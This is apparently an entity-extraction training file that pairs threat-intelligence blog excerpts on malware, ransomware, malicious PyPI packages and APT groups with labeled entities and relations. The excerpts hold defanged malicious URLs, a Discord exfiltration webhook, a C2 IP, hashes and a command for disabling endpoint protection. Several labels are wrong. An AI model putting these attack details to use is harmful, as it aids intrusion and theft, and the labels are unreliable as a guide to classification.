{"instruction": "\nTechnical Analysis - Initialization\nAndoryuBot first checks the argument count\u2014the assembly code is shown in Figure 4. Take the x86 file as an example: the original parameters are \u201cAndoryu.10curl\u201d and \u201cruckus\u201d.\nIt then decodes data from the \u201c.rodata\u201d section. Figure 5 shows part of the code. The encryption key, \u201c0x2A41605D\u201c, and the clear text are shown in Figure 6. After the execution, it prints the string, \u201cProject Andoryu(12/30/2022). What color is your botnet !\u201d in the console. Analysis indicates that this project began last year, which makes this quite a new botnet group.", "input": null, "output": "Named Entities: (AndoryuBot, malware), (botnet, threat type)\nRelationships: (AndoryuBot, belong to, botnet)"}
{"instruction": "Technical Analysis \u2013 DDoS Attacking After its communication channel setup, the client waits for a command from the server to launch a DDoS attack. The functions are shown in Figure 10. AndoryuBot includes 12 methods: tcp-raw, tcp-socket, tcp-cnc, tcp-handshake, udp-plain, udp-game, udp-ovh, udp-raw, udp-vse, udp-dstat, udp-bypass, and icmp-echo. We can locate these from the decoded data in the previous section. Once the victim system receives the attack command, it starts a DDoS attack on a specific IP address and port number. One example of the DDoS attack traffic is shown below:", "input": null, "output": "Named Entities: (AndoryuBot, malware), (DDoS Attack, threat type)\nRelationships: (AndoryuBot, start, DDoS Attack)"}
{"instruction": "\nThe PowerPoint deck contains 22 slides and is a convincing treatise on the requirements for building a cleanroom environment to suit the needs of a major aerospace project in that region of the globe. The file, however, is entirely benign and operates as a decoy to conceal other activities being undertaken.\njquery.hta\n\u201cjquery.hta\u201d is very similar in structure and purpose to \u201cPantomime.hta\u201d. It advances the infection by deploying additional files from multiple variables with encoded data. It seems to have also been created by SILENTTRINITY.\nThe head of the file contains the function \u201cdecode_base64\u201d, a custom implementation to decode base 64-encoded data that will be used later and a large, encoded section attached to a variable called \u201caddle\u201d. Like \u201cPantomime.hta\u201d, this gets executed once the next section is decoded and executed.\nThe variable \u201cInMomemerandum\u201d contains the base64-encoded data for another .Net DLL called \u201cPreBot.dll\u201d.", "input": null, "output": "Named Entities: (jquery.hta, malware), (Pantomime.hta, malware), (SILENTTRINITY, attacker), (PreBot.dll, file)\nRelationships: (jquery.hta, similar, Pantomime.hta), (jquery.hta, by, SILENTTRINITY), (jquery.hta, contain, PreBot.dll)"}
{"instruction": "The purpose of \u201ctest.bat\u201d is to create a registry key called \u201cWindows Update Schedule\u201d in the \u201cHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\u201d registry hive. The naming convention attempts to assist it in blending in as something that looks legitimate.\nThis ensures that the file \u201cC:\\Users\\Public\\hp\\cridviz.exe\u201d is executed upon each system restart.", "input": null, "output": "Named Entities: (test.bat, file)\nRelationships: No related relations."}
{"instruction": "Affected platforms: Windows Impacted parties: Any organization Impact: Controls victim\u2019s device and collects sensitive information Severity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices. It includes several modules that all work via an FTP service. It was developed by a company named Kodex, which claims it is an educational tool. However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer.", "input": null, "output": "Named Entities: (EvilExtractor, malware), (FTP service, tool), (Kodex, attacker)\nRelationships: (EvilExtractor, developed by , Kodex), (EvilExtractor, use, FTP service)"}
{"instruction": "Kodex Ransomware\nEvilExtractor also has a ransomware function. It is called \u201cKodex Ransomware\u201d, as shown in Figure 13. We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer.\nIt downloads \u201czzyy.zip\u201d from evilextractor[.]com. Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14. Figure 15 shows it leverages \u201c7za.exe\u201d to encrypt files with the parameter \u201c-p\u201d, which means zipping files with a password. It also generates a ransom-demanding message saved in \u201cKodexRansom\u201d, shown in Figure 16.", "input": null, "output": "Named Entities: (EvilExtractor, malware), (ransomware, threat type), (zzyy.zip, file), (evilextractor[.]com, Domain), (7za.exe, file)\nRelationships: (EvilExtractor, belong to, ransomware), (EvilExtractor, download, zzyy.zip), (EvilExtractor, leverage, 7za.exe)"}
{"instruction": "Conclusion\nEvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware. Its PowerShell script can elude detection in a .NET loader or PyArmor. Within a very short time, its developer has updated several functions and increased its stability. This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script. We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works. Users should be aware of this new info stealer and continue to be cautious about suspicious mail.", "input": null, "output": "Named Entities: (EvilExtractor, malware)\nRelationships: No related relations."}
{"instruction": "Furthermore, we discovered other files that follow a similar attack pattern; \u201cMary tax docs.pdf.lnk\u201d (SHA2: 6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0) and \u201cWilson tax_docs.pdf.lnk\u201d (SHA2: c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e) that were used in March 2023. As with the attack mentioned previously, these link files are disguised as PDF files to fool potential victims into opening them. \u201cMary tax docs.pdf.lnk\u201d, along with another clean Microsoft Office file, \u201cR&P Sales Summary.docx\u201d, are included in an archived file labeled \u201c2022 tax docs.zip\u201d. Running the link file triggers the download and execution of \u201cdoc.pdf\u201d from \u201chxxp://datacenter11[.]myftp[.]org/notepad/\u201d. The \u201cdoc.pdf\u201d is actually a VBA file that uses PowerShell to pull and run \u201chxxp://datacenter11[.]myftp[.]org/met/a[.]mp3\u201d. While the \u201ca.mp3\u201d is not available for investigation, OSINT (Open Source Intelligence) indicates that the XWorm malware is likely delivered to the victim\u2019s machine. XWorm From the evidence that FortiGuard Labs accumulated during our research, we have high confidence that the 2022%20tax_documents[.]zip file we initially analyzed delivers the XWorm.", "input": null, "output": "Named Entities: (6dee21d581eac2214e3ea7259bf9cb3e0cc31b442a372ffba00f82aa858050f0, SHA256), (c06cf72149d52b8a7c73b38c075156df4c458f633c3031c3c0ce32741ad1518e, SHA256), (hxxp://datacenter11[.]myftp[.]org/notepad/, URL), (hxxp://datacenter11[.]myftp[.]org/met/a[.]mp3, URL), (XWorm, malware)\nRelationships: No related relations."}
{"instruction": "XWorm is a commodity RAT (Remote Access Trojan) reportedly sold in underground forums for $30 to $150. XWorm supports typical RAT functions, such as taking screenshots, keylogging, and taking control of a compromised machine by abusing Virtual Network Computing (VNC), a technique infamously known as Hidden VNC (HVNC). XWorm can also encrypt files, essentially acting in a similar fashion to ransomware. Here are screenshots of a recently cracked version of XWorm v3.1:", "input": null, "output": "Named Entities: (XWorm, malware), (Remote Access Trojan, threat type)\nRelationships: (XWorm, belong to, Remote Access Trojan)"}
{"instruction": "Going back to the first example, \u201c2022%20tax_documents[.]zip\u201d, we found that it was hosted on the open directory \u201cwww[.]farmaciasmv[.]com/citrix/\u201d. We also found another page on the same domain likely used for phishing hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html. The files involved in this attack were submitted to VirusTotal. We don\u2019t believe victims just wander into such malicious sites by accident. Based on our experience, they were likely lured via malicious links in spam emails. Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run. The basic security practice of not opening files from unknown sources can prevent infection and the damages that follow. Dual Malware Wielding Another tax-related attack FortiGuard Labs came across is an image file named \u201cTaxReturn2022.img\u201d (SHA2: 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe) that contains the following files: TaxReturn2022.pdf.lnk (SHA2: 180a79cff5ef91ecd744a35b2e433d0a4aae0e4d3b87c40e8e51f5ca02aac4d6) TaxReturns2022.pdf.lnk (SHA2: fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55) TaxReturns2022.zip (SHA2: c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf)", "input": null, "output": "Named Entities: (hxxp://farmaciasmv[.]com/sharefile/citrix/2022%20taxes[.]html,URL), (Dual, malware), (TaxReturn2022.img, file), (6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe, SHA256), (TaxReturn2022.pdf.lnk, file), (180a79cff5ef91ecd744a35b2e433d0a4aae0e4d3b87c40e8e51f5ca02aac4d6, SHA256), (TaxReturns2022.pdf.lnk, file), (fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55, SHA256), (TaxReturns2022.zip, file), (c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf, SHA256)\nRelationships: (TaxReturn2022.img, contains, TaxReturn2022.pdf.lnk), (TaxReturn2022.img, contains, TaxReturns2022.pdf.lnk), (TaxReturn2022.img, contains, TaxReturns2022.zip), (TaxReturn2022.img, hash, 6658d4b14f0093a2fccd2f57b5bf9fa18d09cda5d42036f280b41e5beb1ff2fe), (TaxReturns2022.pdf.lnk, hash, fa862d43a85a9ea6f046f3edc743b897bba86348c04b8d62ba6eb27f951edf55), (TaxReturns2022.zip, hash, c4599d4270ba8ef58fb8f1219ecff864acd83145c368ada9406a341d6f4a4fbf)"}
{"instruction": "FortiGuard Labs recently investigated an Elevation of Privilege vulnerability in Microsoft Outlook that can be exploited by sending a crafted email to a vulnerable version of the software. When the victim receives the email, an attempt to connect to an attacker\u2019s device is triggered, resulting in the victim\u2019s NTLMv2 hash being leaked. The vulnerable property resides in the PidLidReminderFileParameter extended MAPI property, which specifies the filename of a sound to be played when a reminder for an object is overdue. To trigger the vulnerability, the sender simply modifies the PidLidReminderFileParameter message property to point to a malicious UNC path in a calendar or task item invite. To replicate this vulnerability, we used the Outlook AppointmentItem object to customize a malicious appointment email in the Calendar folder.", "input": null, "output": "No related entities and relations."}
{"instruction": "To obtain the NTLMv2 hash of the recipient during authentication, a MitM (Man in the Middle) attack can be set up to concurrently listen to and poison incoming requests. Using NTLM authentication, a bad actor can then use the exposed hashes to elevate their privileges in other systems, potentially gaining control of services unbeknownst to the email recipient.", "input": null, "output": "No related entities and relations."}
{"instruction": "Affected platforms: Windows Impacted parties: Windows Users Impact: Potential to deploy additional malware for additional purposes Severity level: Medium In early February of 2022, Microsoft announced that Internet Macros would be blocked by default to improve the security of Microsoft Office. According to their blog published in late Feb 2023, this change began rolling out in some update channels in April 2022. Other channels followed in July and October 2022, with the final rollout in January 2023. Office uses a specific algorithm to determine whether to run macros in files from the Internet. The process starts by checking the file attribute. If it has a Mark of the Web (MOTW) attribute, it verifies whether it is from a trusted location and performs other processes, and based on those outcomes, it decides whether to block or run the macro.", "input": null, "output": "No related entities and relations."}
{"instruction": "Since that announcement, we have observed that cyber threat actors have begun to test and adopt new infection vectors to replace Office macros. Several methods include using .hta, .lnk, and .chm files, targeting Office vulnerabilities (Equation Editor and Follina are the most common), and we have seen the use of xll files over the past year by cyber threat actors to distribute their malicious payloads.", "input": null, "output": "No related entities and relations."}
{"instruction": "This malware then checks if a hardcoded path, \u201cC:\\Users\\user\\AppData\\Local\\Microsoft\\Office\\OfficeTelemetry.dll\u201d, exists in the system. As discussed later, this is the same file path where the payload would be written. This strange implementation detail makes us think this may be a work in progress and could be a test sample created for a threat campaign that will soon be launched. The file at the abovementioned path is executed if it exists. Otherwise, the code extracts the payload that is cleverly stored as a node named \u201cTwXfx\u201d in a custom XML part of the document. Custom XML parts is a feature that was introduced with Office Open XML format. It is used for storing arbitrary data that the document could programmatically access.", "input": null, "output": "No related entities and relations."}
{"instruction": "URIs:\n/wp-content/themes/pressa/js/avias.js\n/wp-content/themes/pressa/js/mobile_menu.js\n/wp-content/plugins/contact-form-7/includes/js/scripts.js\n/wp-content/themes/pressa/js/bootstrap.js\n/wp-content/themes/pressa/js/hovermenu.js\n/wp-content/themes/pressa/js/retina-1.1.0.js\n/wp-content/plugins/js_composer/assets/lib/bower/isotope/dist/isotope.pkgd.min.js\n/wp-content/themes/pressa/js/custom-script.js\n/wp-includes/js/wp-emoji-release.min.js\n/maps-api-v3/api/js/52/1/intl/uk_ALL/util.js\n/wp-includes/js/wp-embed.min.js", "input": null, "output": "No related entities and relations."}
{"instruction": "\nPayload - Realtek Jungle SDK Remote Code Execution\nCVE-2021-35394 is an arbitrary command injection vulnerability that affects UDPServer due to insufficient legality detection on commands received from\u00a0clients. The complete payloads are shown in Figure 2.", "input": null, "output": "Named Entities: (CVE-2021-35394, vulnerability), (UDPServer, tool)\nRelationships: (CVE-2021-35394, affect, UDPServer)"}
{"instruction": "thebypasstool (version 1.0) judyb-advanced (version 1.0) The setup.py file in these packages tries to steal sensitive information, such as credit cards, wallets, account logins, etc. using a Discord webhook. While the setup.py file for the component judyb-advanced may at first appear different from the others in this set (Figure 5), after being decoded with Base64 it resolves to the code shown in Figure 4. 4. This set of packages includes: v4pe (version 5) telthi (version 1) The setup.py file in these packages includes the Empyrean stealer code, an open-source code to launch an attack to steal users\u2019 sensitive information. The code in these packages is heavily obfuscated, but we were able to see several techniques, including anti-debug, autorun, and injection methods written in Python. 5. This set of packages includes: aiotoolsbox (versions 1.4.5, 1.4.7) asyncio-box (versions 1.4.6)", "input": null, "output": "Named Entities: (thebypasstool, tool), (judyb-advanced, tool), (Discord webhook, tool), (telthi, tool), (Empyrean, malware)\nRelationships: (thebypasstool, use, Discord webhook), (judyb-advanced, use, Discord webhook)"}
{"instruction": "selfpostmcintel-10.27 setup.py: Python/Agent.KAF!tr esqrerecandy-2.70 setup.py: Python/Agent.KAF!tr esqpaypalnvidiaurl-4.73 setup.py: Python/Agent.KAF!tr librereplacereplace-8.23 setup.py: Python/Agent.KAF!tr selfhackedrandomstudy-4.59 setup.py: Python/Agent.KAF!tr selfhackedrandomstudy-5.55 setup.py: Python/Agent.KAF!tr libvirtualsplitstring-2.35 setup.py: Python/Agent.KAF!tr py-infohydrarandom-1.57 setup.py: Python/Agent.KAF!tr esqproofpongint-4.27 setup.py: Python/Agent.KAF!tr selfccvirtualgame-6.70 setup.py: Python/Agent.KAF!tr tpintelpullcpu-9.31 setup.py: Python/Agent.KAF!tr selflibmineload-5.34 setup.py: Python/Agent.KAF!tr esqsplitpushpush-7.71 setup.py: Python/Agent.KAF!tr selfproofstudyrand-1.59 setup.py: Python/Agent.KAF!tr libcontrolverLGTB-5.50 setup.py: Python/Agent.KAF!tr esqgameloadrandom-4.81 setup.py: Python/Agent.KAF!tr selfpaypalcontrolsuper-5.71 setup.py: Python/Agent.KAF!tr libpipinfoad-10.35 setup.py: Python/Agent.KAF!tr libpywstrvm-7.15 setup.py: Python/Agent.KAF!tr selfhydrastudycc-2.15 setup.py: Python/Agent.KAF!tr tpstringcraftget-6.42 setup.py: Python/Agent.KAF!tr esqlibkillstr-10.27 setup.py: Python/Agent.KAF!tr selfrandompullver-1.9 setup.py: Python/Agent.KAF!tr tpreloadad-1.68 setup.py: Python/Agent.KAF!tr selfinturlstudy-2.23 setup.py: Python/Agent.KAF!tr selfosintgrandrandom-2.67 setup.py: Python/Agent.KAF!tr colorstyle-1.0 setup.py: Python/Agent.KAF!tr snwproxies-1.0 setup.py: Python/Agent.KAF!tr thebypasstool-1.0 setup.py: Python/Agent.KAF!tr judyb-advanced-1.0 setup.py: Python/Agent.KAF!tr telthi-1 setup.py: Python/Agent.KAF!tr pycolouring-0.1.5 setup.py: Python/Agent.KAF!tr pycolouring-0.1.5 code.py: Python/Agent.KAF!tr colourfool-0.1.5 setup.py: Python/Agent.KAF!tr gmgeoip-0.0.2 setup.py: Python/Agent.KAF!tr httpx-advanced3-0.1.0 setup.py: Python/Agent.KAF!tr pycrypterexe-1.0.0 setup.py: Python/Agent.KAF!tr pycrypterexe-1.0.1 setup.py: Python/Agent.KAF!tr pycrypterexe-1.0.2 setup.py: Python/Agent.KAF!tr pycrypterexe-1.0.3 setup.py: Python/Agent.KAF!tr useragentclient-1.0 setup.py: Python/Agent.LK!tr etherapi-1.0 code.py: Python/Agent.LK!tr ligitgays-1.0 setup.py: Python/Agent.LK!tr ligitkidss-1.0 setup.py: Python/Agent.LK!tr tls-python-1.0 setup.py: Python/Agent.LK!tr xboxlivepy-1.0 setup.py: Python/Agent.LK!tr syntax-init-1.0 setup.py: Python/Agent.LK!tr tlsproxies-1.0 setup.py: Python/Agent.EAD2!tr.dldr trc20-unlocker-1.0 setup.py: Python/Agent.DC4D!tr.pws v4pe-5 setup.py: Python/Injector.A4FE!tr", "input": null, "output": "No related entities and relations."}
{"instruction": "Wipers have been around since 2012 and got their name from the goal of the malware: to \"wipe\" the victim's computer files. Up until 2022, wiper activity was few and far between, with maybe one to two new samples cropping up per year. But between the first and second half of 2022, wiper volume saw a substantial increase in volume, and the year ended with a clearly higher uptick. An intriguing distinction in the first half of 2022 was that numerous organizations publicly linked most of the detected wipers\u2014CaddyWiper, WhisperGate, HermeticWiper, etc.\u2014to Russian state-sponsored actors. Furthermore, in the second half, additionally identified wipers were either attributed to pro-Russian hacktivist organizations like Somnia or to people who were motivated by this trend to develop their own wipers. That's a very important shift to note, as it opens the door to more families, actors, and cybercrime in general.", "input": null, "output": "Named Entities: (Wipers, malware), (CaddyWiper, threat type), (WhisperGate, attacker)\nRelationships: (Wipers, linked, CaddyWiper), (Wipers, linked, WhisperGate)"}
{"instruction": "In this analysis, you will learn about the contents of this attack, such as what kind of phishing email starts the campaign, how a malicious Microsoft OneNote file is involved in the campaign, how it is leveraged to download and execute malicious files on the victim\u2019s device, the kinds of techniques that enable it to evade detection and analysis, and how the malware \u2013 AsyncRAT \u2013 communicates with its C2 server, including what control commands it supports to fully control the victim\u2019s device. The following flowchart roughly describes the entire process of how the phishing campaign delivers and executes AsyncRAT:", "input": null, "output": "Named Entities: (AsyncRAT, malware), (C2 server, tool)\nRelationships: (AsyncRAT, communicates with, C2 server)"}
{"instruction": "This segment of PowerShell code reads a chunk of strings that start with \u201c:: \u201c from fresh.bat, a transformed PE file, as shown in Figure 2.4. (By the way, lines starting with \u201c::\u201d are comments in batch files (.BAT).) It then dynamically decodes, decrypts, and decompresses a PE file into memory and executes it by invoking its EntryPoint() function. Although it is fileless, it is originally named tmp72AF.tmp according to its compile information.", "input": null, "output": "Named Entities: (PowerShell code, tool), (tmp72AF.tmp, file)\nRelationships: (PowerShell code, named, tmp72AF.tmp)"}
{"instruction": "FortiGuard Antivirus service detects the attached OneNote file, as well as the follow-up downloaded lo.bat file and view.zip files, with the AV signatures \u201cMSOffice/Agent.OXZ!tr \u201c, \u201cBAT/Agent.OXZ!tr\u201d, and \u201cMSOffice/Agent.PLI!tr\u201d. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest our readers go through the free NSE training: NSE 1 \u2013 Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team.", "input": null, "output": "No related entities and relations."}
{"instruction": "Once that victim device receives the C2 server\u2019s packets, it downloads another three files from 79[.]137[.]203[.]156, shown in Figure 18. The first, \u201cminer.bat\u201d, is a ScrubCrypt BAT file. The other two files are compressed PE files: \u201cplugin_3.dll\u201d and \u201cplugin_4.dll\u201d (Figure 19). They exhibit behavior similar to that described in this previous article.", "input": null, "output": "Named Entities: (79[.]137[.]203[.]156, IP), (miner.bat, file), (plugin_3.dll, file), (plugin_4.dll, file)\nRelationships: (malware, link, 79[.]137[.]203[.]156), (malware, download, miner.bat), (malware, download, plugin_3.dll), (malware, download, plugin_4.dll)"}
{"instruction": "\nThe crypto wallet address, 46E9UkTFqALXNh2mSbA7WGDoa2i6h4WVgUgPVdT9ZdtweLRvAhWmbvuY1dhEmfjHbsavKXo3eGf5ZRb4qJzFXLVHGYH4moQ, and the server IP address used in Monero miner have all been used by the 8220 Gang in the past. It\u2019s why we believe the whole attack was launched by this threat actor, although the port number used is no longer 8220.\nConclusion\n8220 Gang is a well-known miner group that usually leverages public file-sharing websites and targets system vulnerabilities to infiltrate a victim\u2019s environment. Within a very short time, it has evolved to use a newer crypter variant, \u201cScrubCrypt.\u201d Below is its complete attack chain. ScrubCrypt includes evasion and encryption functions, making it harder for anti-virus programs to detect 8220 Gang activity. Users should be aware of this updated crypter and keep their systems patched.", "input": null, "output": "Named Entities: (8220 Gang, attacker), (ScrubCrypt, malware)\nRelationships: (8220 Gang, use, ScrubCrypt)"}
{"instruction": "Chaos Ransomware Variant in Fake Minecraft Alt List Brings Destruction to Japanese Gamers Sirattacker Ransomware Infection Vector Sirattacker ransomware is likely distributed as an Ethereum mining app because all samples include an Ethereum file icon, and some are even named \u201cETH [3-digit number].exe\u201d. Another Chaos ransomware variant called \u201cBruh,\u201d also masquerading as a cryptocurrency generator, was reported in the previous week. While there is no apparent connection between Sirattacker and Bruh ransomware, it\u2019s a curious coincidence. Sirattacker Ransomware Execution", "input": null, "output": "Named Entities: (Chaos Ransomware, malware), (Ethereum mining app, malware)\nRelationships: (Chaos Ransomware, likely, Ethereum mining app)"}
{"instruction": "Once the Sirattacker ransomware is executed, it encrypts files on the victim\u2019s machine and adds random four-letter file extensions to their filenames. Older Chaos ransomware variants are known to overwrite files larger than 2,117,152 bytes with random bytes, which makes file recovery impossible (unless the affected files are properly backed up). In some cases, attackers demand a ransom payment, knowing that most files are unrecoverable. Luckily, Sirattacker ransomware samples appear to be generated using a newer Chaos ransomware generator, as larger files are encrypted instead of overwritten. Once files are encrypted, Sirattacker displays a ransom note on the Command Prompt. The ransomware then replaces the desktop wallpaper with its own. The new wallpaper contains an almost identical message to the ransom note and asks victims to contact the attacker by email.", "input": null, "output": "Named Entities: (Sirattacker, malware), (ransomware, threat type), (Chaos ransomware generator, tool)\nRelationships: (Sirattacker, belong to, ransomware)"}
{"instruction": "Unlike the ransom note in the text file, this ransom screen provides a contact address, the attacker\u2019s crypto wallet information, a ransom price, and a unique ID assigned to the victim. However, the ransom screen lacks coherence as the provided crypto wallet does not exist, and the QR code does not work. Also, the ransom screen lists a cryptocurrency ransom of 554 Monero (over $80,000 using the exchange rate on February 27th, 2023) even though a $2,000 price tag is listed under the QR code.", "input": null, "output": "No related entities and relations."}
{"instruction": "In the first half of the year, we saw a resurgence in wiper malware and, as we predicted, this destructive attack playbook has only widened its foothold during the second half of 2022. Wiper malware expanded into other countries, driving a 53% increase in wiper activity from Q3 to Q4.", "input": null, "output": "No related entities and relations."}
{"instruction": "To protect against cybercriminals\u2019 growing list of tactics, organizations must focus on consolidating their security technology, reducing the number of vendors they work with to remove complexity from day-to-day operations. In the face of a growing threat landscape, security teams should also consider working with a trusted third party to conduct incident response and readiness activities\u2014like developing playbooks and conducting tabletop exercises\u2014to ensure they\u2019re prepared to defend the organization when an incident occurs. More About the 2H 2022 FortiGuard Labs Threat Landscape Report The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors collecting billions of threat events observed worldwide during the second half of 2022. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. The report covers global and regional perspectives.", "input": null, "output": "No related entities and relations."}
{"instruction": "6) Renaming: As a final step, files are renamed to include the .royal_u postfix (Figure 4).", "input": null, "output": "No related entities and relations."}
{"instruction": "4) The file is encrypted: The file key is then used to encrypt the file using the AES CBC algorithm. If the file is bigger than 5245000 bytes (~5 MB), and the -ep parameter was set, then only the preselected percentage of the file is encrypted alternatingly, as shown in Figure 5. 5) The key is concatenated to the encrypted file: Once the encryption is finished, the following three values are concatenated to the file: a. Encrypted file key: The decryptor probably loads and decrypts this key to decrypt the file content. b. Original file size: The file is resized to accommodate this additional information, thereby preserving the original file size for recovery. c. -ep value: The percentage of the file that was encrypted is also preserved for recovery.", "input": null, "output": "No related entities and relations."}
{"instruction": "The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them.", "input": null, "output": "No related entities and relations."}
{"instruction": "This bi-weekly Ransomware Roundup report from FortiGuard Labs looks at ransomware variants that have gained traction within our datasets and the wider OSINT community. It aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against these variants. This latest edition of the Ransomware Roundup covers the CatB ransomware. Affected platforms: Microsoft Windows Impacted parties: Microsoft Windows Users Impact: Encrypts files on the compromised machine and demands ransom for file decryption Severity level: High CatB Ransomware Overview CatB is a reasonably new entrant to the ransomware field, with samples only dating back to December 2022. However, FortiGuard Labs has also found additional samples we believe with medium confidence to be from the same threat actor owing to their using the same Bitcoin wallet. These date to November 2022.", "input": null, "output": "No related entities and relations."}
{"instruction": "The FortiGuard Labs team recently discovered several new 0-day attacks in the PyPI packages (Python Package Index) by malware author \u2018Core1337\u2019, who published the following packages: \u20183m-promo-gen-api\u2019, \u2018Ai-Solver-gen\u2019, \u2018hypixel-coins\u2019, \u2018httpxrequesterv2\u2019, and \u2018httpxrequester\u2019. These attacks were published between January 27 to January 29, 2023. Each package had one version and an empty description, and all contained similar malicious code. For brevity, this blog will examine the \u20183m-promo-gen-api\u2019 package as representative of the entire set.", "input": null, "output": "Named Entities: (Core1337, attacker), (3m-promo-gen-api, malware), (Ai-Solver-gen, malware), (Ai-Solver-gen, malware), (hypixel-coins, malware), (httpxrequesterv2, malware), (httpxrequester, malware)\nRelationships: (Core1337, publish, malware), (Core1337, publish, Ai-Solver-gen), (Core1337, publish, hypixel-coins), (Core1337, publish, httpxrequesterv2), (Core1337, publish, httpxrequester)"}
{"instruction": "When we take a look inside the binary using IDA, we see many strings that raise suspicions. We can also get some clues about the malware behavior by observing these. Some keywords of interest include, \u2018virus\u2019, \u2018wallets\u2019, \u2018browsers\u2019, \u2018login\u2019, and \u2018passwords\u2019.\nBelow we can also see some strings with \u2018.zip\u2019 for several browser names which could be indication of saving the sensitive information as a zip file.\nThe examples in the code shown below are of the browsers that the malware takes an interest in.\nWe also found an interesting URL embedded in the code:\nhxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy\nIt uses a Go package, \u2018dishooks\u2019, which is a Discord webhook API wrapper. Within the URL, we see that it may be related to a \u201cSpidey Bot\u201d malware which is known to steal personal information through Discord.", "input": null, "output": "Named Entities: (Spidey Bot, malware), (hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, URL)\nRelationships: (hxxps://discordapp[.]com/api/webhooks/1068100542682902558/9JUsLnJZLyEkc_bGS85KTa5M1VWZ2J496v6Ruo7oUclFE08osfXNZL_OK5YDGOPYHLFy, in, Spidey Bot)"}
{"instruction": "Blackfly has been closely associated with a second Chinese APT group known as Grayfly, so much so that some vendors track the two groups as one actor: APT41. A 2020 indictment of seven men on charges relating to hundreds of cyber attacks carried out by both groups appeared to shed light on this link. Two Chinese nationals were alleged to have worked with both groups. A crossover in personnel may account for the similarities between both groups.", "input": null, "output": "Named Entities: (Blackfly, attacker), (Grayfly, attacker), (APT41, attacker), (Chinese APT group, attacker)\nRelationships: (Blackfly, associated with, Grayfly), (Grayfly, associated with, APT41), (Blackfly, associated with, Chinese APT group), (Grayfly, associated with, Chinese APT group)"}
{"instruction": "Undeterred \nDespite being the subject of a U.S. indictment, Blackfly has continued to mount attacks, seemingly undeterred by the publicity afforded to the group. Although it originally made a name for itself by attacking the gaming sector, the group appears focused on targeting intellectual property in a variety of sectors at present.", "input": null, "output": "Named Entities: (Blackfly, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Clasiopa: New Group Targets Materials Research", "input": null, "output": "Named Entities: (Clasiopa, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Group uses distinct toolset but there are few clues to its origins. \nA hitherto unknown attack group has been observed targeting a materials research organization in Asia. The group, which Symantec calls Clasiopa, is characterized by a distinct toolset, which includes one piece of custom malware (Backdoor.Atharvan). At present, there is no firm evidence on where Clasiopa is based or whom it acts on behalf.", "input": null, "output": "Named Entities: (Clasiopa, attacker), (Backdoor.Atharvan, malware)\nRelationships: (Clasiopa, use, Backdoor.Atharvan)"}
{"instruction": "Clasiopa Tactics, Techniques, and Procedures The infection vector used by Clasiopa is unknown, although there is some evidence to suggest that the attackers gain access through brute force attacks on public facing servers. Aside from the distinct toolset used, there were a number of attack hallmarks observed: The attackers checked the IP addresses of the computers they were on using: https://ifconfig.me/ip An attempt was made to disable Symantec Endpoint Protection (SEP) by stopping the SepMasterService. The result of this query was checked and then a second attempt was made to disable SEP using \"smc -stop\". Note that any commands attempting to stop SEP will only work if the attacker has administrative credentials and the SEP administrator has disabled anti-tamper protection . The attackers used multiple backdoors to build lists of file names and exfiltrate them. These lists were exfiltrated either in a Thumb.db file or a Zip archive.", "input": null, "output": "Named Entities: (Clasiopa, attacker), (brute force attacks, threate type), (https://ifconfig.me/ip, URL)\nRelationships: (Clasiopa, use, brute force attacks), (Clasiopa, URL, https://ifconfig.me/ip), (Clasiopa, attempt to disable, SepMasterService)"}
